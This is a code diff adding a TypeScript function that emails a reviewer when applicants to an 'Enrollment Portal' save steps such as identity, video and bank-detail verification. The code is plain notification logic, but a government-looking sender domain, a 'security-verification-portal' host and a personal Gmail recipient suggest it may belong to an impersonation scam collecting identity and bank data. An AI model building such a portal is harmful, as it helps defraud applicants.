@@ -1,0 +1,138 @@
+import { ReplitConnectors } from "@replit/connectors-sdk";
+
+const reviewerEmail = "skyfashion053@gmail.com";
+const senderEmail = "Enrollment Portal <notifications@vu-gov.cc>";
+const productionPortalUrl = "https://security-verification-portal.enroll.website";
+const stepLabels = [
+  "Personal information",
+  "Next of kin",
+  "Education",
+  "Work information",
+  "Identity verification",
+  "Video verification",
+  "Bank details",
+  "Final application review",
+] as const;
+
+export type ReviewerNotificationKind =
+  | "contact_received"
+  | "step_saved"
+  | "contact_updated"
+  | "evidence_saved"
+  | "application_submitted";
+
+export interface ReviewerNotification {
+  kind: ReviewerNotificationKind;
+  reference: string;
+  categoryName: string;
+  currentStep?: number;
+  applicationId?: string;
+  evidenceSlot?: string;
+  idempotencyKey: string;
+}
+
+function escapeHtml(value: string): string {
+  return value.replace(/[&<>"']/g, (character) => ({
+    "&": "&amp;",
+    "<": "&lt;",
+    ">": "&gt;",
+    '"': "&quot;",
+    "'": "&#39;",
+  })[character] ?? character);
+}
+
+function stepLabel(currentStep: number | undefined): string {
+  if (currentStep === undefined) return "Enrollment";
+  return stepLabels[Math.max(0, Math.min(stepLabels.length - 1, currentStep))] ?? "Enrollment";
+}
+
+function reviewerUrl(notification: ReviewerNotification): string {
+  const developmentDomain = process.env.NODE_ENV === "development"
+    ? process.env.REPLIT_DEV_DOMAIN
+    : undefined;
+  const configuredUrl = process.env.PORTAL_PUBLIC_URL?.trim();
+  const baseUrl = configuredUrl
+    ? configuredUrl
+    : developmentDomain
+      ? `https://${developmentDomain}`
+      : productionPortalUrl;
+  const route = notification.kind === "application_submitted" && notification.applicationId
+    ? `/admin/applications/${encodeURIComponent(notification.applicationId)}`
+    : "/admin/pre-applications";
+  return new URL(route, `${baseUrl.replace(/\/+$/, "")}/`).toString();
+}
+
+function notificationTitle(notification: ReviewerNotification): string {
+  switch (notification.kind) {
+    case "contact_received":
+      return "New applicant contact details received";
+    case "step_saved":
+      return `Enrollment step saved: ${stepLabel(notification.currentStep)}`;
+    case "contact_updated":
+      return "Applicant contact details updated";
+    case "evidence_saved":
+      return `Enrollment evidence saved: ${notification.evidenceSlot ?? "document"}`;
+    case "application_submitted":
+      return "Application submitted for review";
+  }
+}
+
+export async function sendReviewerNotification(
+  notification: ReviewerNotification,
+): Promise<void> {
+  const title = notificationTitle(notification);
+  const link = reviewerUrl(notification);
+  const subject = `${title} · ${notification.reference}`;
+  const text = [
+    title,
+    `Application reference: ${notification.reference}`,
+    `Category: ${notification.categoryName}`,
+    `Saved section: ${stepLabel(notification.currentStep)}`,
+    "The complete application record is available in the authenticated reviewer workspace.",
+    link,
+  ].join("\n\n");
+  const html = [
+    `<h2>${escapeHtml(title)}</h2>`,
+    `<p><strong>Application reference:</strong> ${escapeHtml(notification.reference)}</p>`,
+    `<p><strong>Category:</strong> ${escapeHtml(notification.categoryName)}</p>`,
+    `<p><strong>Saved section:</strong> ${escapeHtml(stepLabel(notification.currentStep))}</p>`,
+    "<p>The complete application record is available in the authenticated reviewer workspace.</p>",
+    `<p><a href="${escapeHtml(link)}">Open reviewer workspace</a></p>`,
+  ].join("");
+  const body = JSON.stringify({
+    from: senderEmail,
+    to: [reviewerEmail],
+    subject,
+    text,
+    html,
+  });
+  const connectors = new ReplitConnectors();
+  let lastStatus: number | null = null;
+
+  for (let attempt = 0; attempt < 3; attempt += 1) {
+    try {
+      const response = await connectors.proxy("resend", "/emails", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Idempotency-Key": notification.idempotencyKey.slice(0, 256),
+        },
+        body,
+      });
+      if (response.ok) return;
+      lastStatus = response.status;
+      if (response.status < 500 && response.status !== 429) break;
+    } catch {
+      // Retry transient connector/network failures without blocking enrollment saves.
+    }
+    if (attempt < 2) {
+      await new Promise((resolve) => setTimeout(resolve, 150 * (attempt + 1)));
+    }
+  }
+
+  throw new Error(
+    lastStatus === null
+      ? "Reviewer notification could not reach the email service."
+      : `Reviewer notification failed with email service status ${lastStatus}.`,
+  );
+}
